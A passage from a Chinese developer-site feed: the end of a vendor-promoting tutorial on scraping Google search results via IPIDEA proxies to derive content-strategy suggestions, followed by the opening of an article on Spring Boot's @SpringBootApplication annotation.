                    <span class="hljs-string">"questions"</span>: <span class="hljs-string">f"相关问题(<span class="hljs-subst">{value}</span>)"</span>,
                    <span class="hljs-string">"featured_snippet"</span>: <span class="hljs-string">"精选摘要"</span>,
                    <span class="hljs-string">"comparison"</span>: <span class="hljs-string">"对比内容"</span>
                }[module]
                active_modules.append(display_name)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"SERP模块: <span class="hljs-subst">{<span class="hljs-string">', '</span>.join(active_modules) <span class="hljs-keyword">if</span> active_modules <span class="hljs-keyword">else</span> <span class="hljs-string">'基础搜索结果'</span>}</span>"</span>)
        
        <span class="hljs-comment"># 显示内容策略建议</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"内容策略建议:"</span>)
        <span class="hljs-keyword">for</span> i, strategy <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(analysis[<span class="hljs-string">"strategies"</span>], <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   <span class="hljs-subst">{i}</span>. <span class="hljs-subst">{strategy}</span>"</span>)

<span class="hljs-comment"># 生成最终报告</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"生成最终内容策略报告"</span>)

generate_content_strategy_report(serp_analyses)

<span class="hljs-comment"># 添加总结统计</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"整体分析总结"</span>)

total_strategies = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">len</span>(analysis[<span class="hljs-string">"strategies"</span>]) <span class="hljs-keyword">for</span> analysis <span class="hljs-keyword">in</span> serp_analyses.values())
avg_strategies = total_strategies / <span class="hljs-built_in">len</span>(serp_analyses) <span class="hljs-keyword">if</span> serp_analyses <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"• 分析关键词总数: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(serp_analyses)}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"• 生成策略建议总数: <span class="hljs-subst">{total_strategies}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"• 平均每个关键词建议数: <span class="hljs-subst">{avg_strategies:<span class="hljs-number">.1</span>f}</span>"</span>)

<span class="hljs-comment"># 显示最推荐的策略类型</span>
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
all_strategies = []
<span class="hljs-keyword">for</span> analysis <span class="hljs-keyword">in</span> serp_analyses.values():
    all_strategies.extend(analysis[<span class="hljs-string">"strategies"</span>])

strategy_counts = Counter(all_strategies)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"• 最常推荐策略:"</span>)
<span class="hljs-keyword">for</span> strategy, count <span class="hljs-keyword">in</span> strategy_counts.most_common(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - <span class="hljs-subst">{strategy}</span>: <span class="hljs-subst">{count}</span>次"</span>)
</code></pre>
<p><strong>实际输出：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/830d395d4a284f59b158adefc690a977~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=YMvuAB1yEdkWsuzi0ZeFhCGEUTI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-16">完整整合版（可直接运行）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SERPContentStrategy</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># IPIDEA代理配置</span>
        self.proxy_url = <span class="hljs-string">"http://YOUR_USERNAME:YOUR_PASSWORD@proxy.ipidea.io:2333"</span>
        self.proxies = {<span class="hljs-string">"http"</span>: self.proxy_url, <span class="hljs-string">"https"</span>: self.proxy_url}
        self.headers = {
            <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_keywords</span>(<span class="hljs-params">self, keywords</span>):
        <span class="hljs-string">"""分析多个关键词的SERP结构"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"SERP模块分析 - 内容策略指导"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"使用IPIDEA代理: <span class="hljs-subst">{self.proxy_url}</span>"</span>)
        
        <span class="hljs-comment"># 数据采集阶段</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n阶段1: 数据采集"</span>)
        serp_html_data = {}
        <span class="hljs-keyword">for</span> i, keyword <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keywords, <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[<span class="hljs-subst">{i}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(keywords)}</span>] 获取: <span class="hljs-subst">{keyword}</span>"</span>)
            
            html = self.get_serp_html(keyword)
            <span class="hljs-keyword">if</span> html:
                serp_html_data[keyword] = html
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   成功 (<span class="hljs-subst">{<span class="hljs-built_in">len</span>(html)}</span> 字符)"</span>)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   失败，请检查代理配置"</span>)
            time.sleep(<span class="hljs-number">2</span>)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n采集完成: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(serp_html_data)}</span>/<span class="hljs-subst">{<span class="hljs-built_in">len</span>(keywords)}</span> 成功"</span>)
        
        <span class="hljs-comment"># 数据分析阶段</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n阶段2: 数据分析"</span>)
        analyses = {}
        <span class="hljs-keyword">for</span> keyword, html <span class="hljs-keyword">in</span> serp_html_data.items():
            analysis = self.analyze_serp_structure(html, keyword)
            analyses[keyword] = analysis
            self.display_insight(analysis)
        
        <span class="hljs-comment"># 报告生成阶段</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n阶段3: 报告生成"</span>)
        self.generate_final_report(analyses)
        
        <span class="hljs-keyword">return</span> analyses
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_serp_html</span>(<span class="hljs-params">self, keyword</span>):
        <span class="hljs-string">"""使用IPIDEA代理获取SERP页面"""</span>
        url = <span class="hljs-string">f"https://www.google.com/search?q=<span class="hljs-subst">{requests.utils.quote(keyword)}</span>&amp;gl=us&amp;num=10"</span>
        <span class="hljs-keyword">try</span>:
            resp = requests.get(url, headers=self.headers, proxies=self.proxies, timeout=<span class="hljs-number">15</span>)
            <span class="hljs-keyword">return</span> resp.text <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_serp_structure</span>(<span class="hljs-params">self, html, keyword</span>):
        <span class="hljs-string">"""分析SERP结构"""</span>
        html_lower = html.lower()
        
        modules = {
            <span class="hljs-string">"ads"</span>: <span class="hljs-built_in">min</span>(html.count(<span class="hljs-string">'Ad'</span>), <span class="hljs-number">10</span>),
            <span class="hljs-string">"shopping"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'shop'</span>, <span class="hljs-string">'buy'</span>, <span class="hljs-string">'price'</span>]),
            <span class="hljs-string">"videos"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'youtube'</span>, <span class="hljs-string">'video'</span>, <span class="hljs-string">'watch'</span>]),
            <span class="hljs-string">"news"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'news'</span>, <span class="hljs-string">'latest'</span>, <span class="hljs-string">'update'</span>]),
            <span class="hljs-string">"questions"</span>: <span class="hljs-built_in">min</span>(html_lower.count(<span class="hljs-string">'?'</span>), <span class="hljs-number">10</span>),
            <span class="hljs-string">"comparison"</span>: <span class="hljs-built_in">any</span>(word <span class="hljs-keyword">in</span> html_lower <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> [<span class="hljs-string">'vs'</span>, <span class="hljs-string">'compare'</span>, <span class="hljs-string">'comparison'</span>])
        }
        
        strategies = self.generate_strategies(modules, keyword)
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"modules"</span>: modules, <span class="hljs-string">"strategies"</span>: strategies, <span class="hljs-string">"keyword"</span>: keyword}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_strategies</span>(<span class="hljs-params">self, modules, keyword</span>):
        <span class="hljs-string">"""生成内容策略"""</span>
        strategies = []
        
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"ads"</span>] &gt;= <span class="hljs-number">3</span>:
            strategies.append(<span class="hljs-string">"制作购买指南和产品对比"</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"shopping"</span>]:
            strategies.append(<span class="hljs-string">"创建产品评测和购买建议"</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"videos"</span>]:
            strategies.append(<span class="hljs-string">"投资视频开箱或评测内容"</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"questions"</span>] &gt; <span class="hljs-number">3</span>:
            strategies.append(<span class="hljs-string">"制作FAQ解答用户问题"</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"comparison"</span>]:
            strategies.append(<span class="hljs-string">"制作详细竞品对比分析"</span>)
        
        <span class="hljs-comment"># 关键词类型建议</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"review"</span> <span class="hljs-keyword">in</span> keyword:
            strategies.append(<span class="hljs-string">"创建深度产品评测内容"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"unboxing"</span> <span class="hljs-keyword">in</span> keyword:
            strategies.append(<span class="hljs-string">"制作开箱视频和第一印象"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"buying guide"</span> <span class="hljs-keyword">in</span> keyword:
            strategies.append(<span class="hljs-string">"制作购买建议和配置推荐"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"setup"</span> <span class="hljs-keyword">in</span> keyword <span class="hljs-keyword">or</span> <span class="hljs-string">"tutorial"</span> <span class="hljs-keyword">in</span> keyword:
            strategies.append(<span class="hljs-string">"制作详细设置教程"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">"vs"</span> <span class="hljs-keyword">in</span> keyword:
            strategies.append(<span class="hljs-string">"制作功能对比表格"</span>)
        
        <span class="hljs-keyword">return</span> strategies <span class="hljs-keyword">if</span> strategies <span class="hljs-keyword">else</span> [<span class="hljs-string">"创建综合信息内容"</span>]
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display_insight</span>(<span class="hljs-params">self, analysis</span>):
        <span class="hljs-string">"""显示分析洞察"""</span>
        modules = analysis[<span class="hljs-string">"modules"</span>]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   <span class="hljs-subst">{analysis[<span class="hljs-string">'keyword'</span>]}</span>: <span class="hljs-subst">{modules[<span class="hljs-string">'ads'</span>]}</span>广告 | <span class="hljs-subst">{modules[<span class="hljs-string">'questions'</span>]}</span>问题 | "</span>, end=<span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"shopping"</span>]: <span class="hljs-built_in">print</span>(<span class="hljs-string">"购物 "</span>, end=<span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"videos"</span>]: <span class="hljs-built_in">print</span>(<span class="hljs-string">"视频 "</span>, end=<span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"news"</span>]: <span class="hljs-built_in">print</span>(<span class="hljs-string">"新闻 "</span>, end=<span class="hljs-string">""</span>)
        <span class="hljs-keyword">if</span> modules[<span class="hljs-string">"comparison"</span>]: <span class="hljs-built_in">print</span>(<span class="hljs-string">"对比 "</span>, end=<span class="hljs-string">""</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"→ <span class="hljs-subst">{<span class="hljs-string">' | '</span>.join(analysis[<span class="hljs-string">'strategies'</span>][:<span class="hljs-number">2</span>])}</span>"</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_final_report</span>(<span class="hljs-params">self, analyses</span>):
        <span class="hljs-string">"""生成最终报告"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"最终内容策略报告"</span>)
        
        total_strategies = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">len</span>(analysis[<span class="hljs-string">"strategies"</span>]) <span class="hljs-keyword">for</span> analysis <span class="hljs-keyword">in</span> analyses.values())
        avg_strategies = total_strategies / <span class="hljs-built_in">len</span>(analyses) <span class="hljs-keyword">if</span> analyses <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n执行摘要:"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   • 分析关键词: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(analyses)}</span> 个"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   • 生成策略: <span class="hljs-subst">{total_strategies}</span> 条"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   • 平均每个关键词: <span class="hljs-subst">{avg_strategies:<span class="hljs-number">.1</span>f}</span> 条建议"</span>)
        
        <span class="hljs-comment"># 策略分布</span>
        all_strategies = []
        <span class="hljs-keyword">for</span> analysis <span class="hljs-keyword">in</span> analyses.values():
            all_strategies.extend(analysis[<span class="hljs-string">"strategies"</span>])
        
        strategy_counts = Counter(all_strategies)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n热门策略排名:"</span>)
        <span class="hljs-keyword">for</span> i, (strategy, count) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(strategy_counts.most_common(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"   <span class="hljs-subst">{i}</span>. <span class="hljs-subst">{strategy}</span> (<span class="hljs-subst">{count}</span>次)"</span>)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n分析完成! 建议优先执行排名前3的策略"</span>)

<span class="hljs-comment"># 使用示例</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    analyzer = SERPContentStrategy()
    keywords = [
        <span class="hljs-string">"iPhone 17 Pro review"</span>,
        <span class="hljs-string">"MacBook Air M4 unboxing"</span>,
        <span class="hljs-string">"iPad Pro 2025 buying guide"</span>,
        <span class="hljs-string">"Apple Watch Series 11 setup tutorial"</span>,
        <span class="hljs-string">"AirPods Pro 4 vs Bose comparison"</span>
    ]
    
    results = analyzer.analyze_keywords(keywords)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n所有任务完成! 共处理 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(results)}</span> 个关键词"</span>)
</code></pre>
<p>通过这种方法，内容团队可以更科学地针对不同产品线来制作相应类型的内容，基于实际搜索数据制定策略，显著提高内容投资回报率。系统自动识别 SERP 特征，为每个产品线提供定制化建议，防止凭感觉决策。</p>
<p>除了自己抓取和解析 HTML，我们也可以直接使用 IPIDEA 的 SERP API。通过 API 获取的数据更稳定，减少了验证码和封锁的干扰，可以跨区域抓取不同国家的 SERP，也更方便持续监控趋势和生成分析报告。</p>
<h2 data-id="heading-17">使用 IPIDEA SERP API 获取搜索结果</h2>
<h4 data-id="heading-18">步骤 1：获取 API 链接</h4>
<p>在 IPIDEA 面板中选择 <strong>SERP API</strong> 功能</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbd0942d07f94d40a721053841c5d9f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35oul:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764224081&amp;x-signature=x3Ay0xF7NeZgg1fr700ywCrjS%2Fs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>设置国家/地区、关键词、代理类型（动态住宅 IP 推荐）、每次返回条数等然后即可获取 Token。</p>
<p>点击生成 API 链接，例如：</p>
<pre><code class="hljs language-ini" lang="ini">https://api.ipidea.net/serp?<span class="hljs-attr">apikey</span>=YOUR_API_KEY&amp;q=python requests&amp;gl=us&amp;hl=en&amp;num=<span class="hljs-number">10</span>&amp;proxy_type=dynamic
</code></pre>
<h4 data-id="heading-19">步骤 2：使用 Python 请求 API</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> http.client 
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode
conn = http.client.HTTPSConnection(<span class="hljs-string">"scraper.ipidea.net"</span>)
params = {
        <span class="hljs-string">"url"</span>: <span class="hljs-string">"https://www.google.com/search"</span>,
        <span class="hljs-string">"q"</span>: <span class="hljs-string">"pizza"</span>,
        <span class="hljs-string">"json"</span>: <span class="hljs-string">"1"</span>
      }
payload = urlencode(params) 

headers = { 
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer token'</span>,
  <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>
}

conn.request(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"/request"</span>, payload, headers) 
res = conn.getresponse() 
data = res.read() 
<span class="hljs-built_in">print</span>(data.decode(<span class="hljs-string">"utf-8"</span>))
</code></pre>
<p>发送请求后，API 就可以返回 JSON/HTML 格式的输出结果。</p>
<h2 data-id="heading-20"><strong>总结</strong></h2>
<p>通过以上这两个实操示例，我们搭建了完整的 SERP 数据分析工作流。从基础的 PyPI 包信息监控到较为复杂的内容策略制定，将杂乱的搜索结果转化为了清晰的数据洞察。每个环节都提供了可运行的代码和实用的业务逻辑，让大家能够快速上手并应用到实际工作中。</p>
<p>在实际使用中，如果需要进行小规模的分析，手动采集和解析 HTML 是完全可行的方案。但如果业务需要大规模运行、希望减少验证码干扰，或者需要直接获取结构化 JSON 数据，建议还是使用专业的 SERP API 服务（如 <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.ipidea.net%2F%3Futm-source%3Dhyy%26utm-keyword%3D%3Fhyy" target="_blank" title="http://www.ipidea.net/?utm-source=hyy&amp;utm-keyword=?hyy" ref="nofollow noopener noreferrer">IPIDEA</a> 的 SERP API）。无论是手动抓取还是借助专业 API，核心目标都是将这些信息转化为统一的结构化数据，建立可复用、可监控的数据管线。</p>
<p>在营销竞争日益激烈的当下，你会发现单纯关注排名是远远不够的。真正重要的是理解搜索结果页面背后的用户意图——他们到底在寻找什么？市场上缺少什么内容？哪些内容形式更受欢迎？精准的内容策略方向比盲目的内容生产更重要。希望以上理论方法能帮助到大家用数据驱动决策，让每一份内容投入都产生真正的价值。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[@SpringBootApplication 注解（Spring Boot 自动配置）详解]]></title>    <link>https://juejin.cn/post/7574680270537965568</link>    <guid>https://juejin.cn/post/7574680270537965568</guid>    <pubDate>2025-11-21T03:50:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574680270537965568" data-draft-id="7574685632095731739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="@SpringBootApplication 注解（Spring Boot 自动配置）详解"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-21T03:50:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moe488"/> <meta itemprop="url" content="https://juejin.cn/user/1863002275971387"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            @SpringBootApplication 注解（Spring Boot 自动配置）详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1863002275971387/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moe488
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:50:31.000Z" title="Fri Nov 21 2025 03:50:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、引言</h2>
<p><code>@SpringBootApplication</code> 是 Spring Boot 框架中最核心的注解，它整合了多个 Spring 注解的功能，实现了 Spring Boot 的"约定大于配置"理念。理解 <code>@SpringBootApplication</code> 的底层实现原理，对于深入掌握 Spring Boot 框架至关重要。</p>
<p>本文将从源码层面深入解析 <code>@SpringBootApplication</code> 注解及其内部组合的各个注解，重点关注自动配置机制、组件扫描机制和配置类代理模式等核心内容。</p>
<h2 data-id="heading-1">二、@SpringBootApplication 注解概览</h2>
<h3 data-id="heading-2">2.1 注解定义</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Target(ElementType.TYPE)</span>
<span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span>
<span class="hljs-meta">@Documented</span>
<span class="hljs-meta">@Inherited</span>
<span class="hljs-meta">@SpringBootConfiguration</span>
<span class="hljs-meta">@EnableAutoConfiguration</span>
<span class="hljs-meta">@ComponentScan(excludeFilters = {
    @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class),
    @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class)
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootApplication {
    <span class="hljs-meta">@AliasFor(annotation = EnableAutoConfiguration.class)</span>
    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-meta">@AliasFor(annotation = EnableAutoConfiguration.class)</span>
    String[] excludeName() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-meta">@AliasFor(annotation = ComponentScan.class, attribute = "basePackages")</span>
    String[] scanBasePackages() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-meta">@AliasFor(annotation = ComponentScan.class, attribute = "basePackageClasses")</span>
    Class&lt;?&gt;[] scanBasePackageClasses() <span class="hljs-keyword">default</span> {};
    
    <span class="hljs-meta">@AliasFor(annotation = ComponentScan.class, attribute = "nameGenerator")</span>
    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BeanNameGenerator</span>&gt; nameGenerator() <span class="hljs-keyword">default</span> BeanNameGenerator.class;
    
    <span class="hljs-meta">@AliasFor(annotation = Configuration.class)</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h3 data-id="heading-3">2.2 核心组成</h3>
<p><code>@SpringBootApplication</code> 注解内部组合了三个核心注解：</p>
<ol>
